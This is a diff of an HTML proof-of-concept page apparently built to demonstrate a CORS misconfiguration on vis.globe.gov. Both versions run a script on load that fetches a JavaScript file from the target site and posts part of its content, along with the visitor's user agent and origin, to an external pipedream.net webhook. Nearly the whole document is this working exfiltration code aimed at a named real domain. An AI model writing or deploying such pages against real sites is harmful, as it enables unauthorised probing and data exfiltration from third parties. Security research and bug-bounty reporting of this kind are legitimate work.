@@ -1,43 +1,48 @@
 <!DOCTYPE html>
 <html>
-<head><title>CORS Exploit Final</title></head>
+<head>
+  <title>🔥 Exploiting vis.globe.gov CORS</title>
+  <meta charset="UTF-8">
+</head>
 <body>
-<h2>🔥 Exploiting vis.globe.gov CORS</h2>
-<pre id="log">Loading...</pre>
+  <pre id="status">Loading...</pre>
 
-<script>
-const webhook = "https://eo6hxedl2p03s10.m.pipedream.net";
+  <script>
+    const victimUrl = 'https://vis.globe.gov/GLOBE/VISmain.js';
+    const exfilUrl = 'https://eojzzzf3qvc4t0o.m.pipedream.net';
 
-function log(msg) {
-  document.getElementById("log").textContent += "\n" + msg;
-}
+    async function exploitCORS() {
+      try {
+        const res = await fetch(victimUrl, {
+          method: 'GET',
+          mode: 'cors',
+          credentials: 'omit' // safe for wildcard origins
+        });
 
-(async () => {
-  try {
-    const res = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js");
-    const text = await res.text();
+        const data = await res.text();
+        document.getElementById('status').innerText = '✅ Loaded VISmain.js (status ' + res.status + ')';
 
-    log("✅ Loaded VISmain.js (status " + res.status + ")");
+        await fetch(exfilUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: 'CORS Exploit Successful',
+            status: res.status,
+            length: data.length,
+            content_sample: data.slice(0, 500),  // send first 500 chars only
+            userAgent: navigator.userAgent,
+            origin: location.origin,
+            timestamp: new Date().toISOString()
+          })
+        });
 
-    const params = new URLSearchParams();
-    params.append("origin", location.origin);
-    params.append("ua", navigator.userAgent);
-    params.append("snippet", text.slice(0, 500));
-    params.append("time", new Date().toISOString());
+        document.getElementById('status').innerText += '\n📬 Webhook POST sent!';
+      } catch (err) {
+        document.getElementById('status').innerText = '❌ Exploit failed: ' + err;
+      }
+    }
 
-    const send = await fetch(webhook, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"  // ✅ هذا لا يسبب preflight
-      },
-      body: params
-    });
-
-    log("📤 Webhook POST Status: " + send.status);
-  } catch (e) {
-    log("❌ Error: " + e.message);
-  }
-})();
-</script>
+    exploitCORS();
+  </script>
 </body>
 </html>
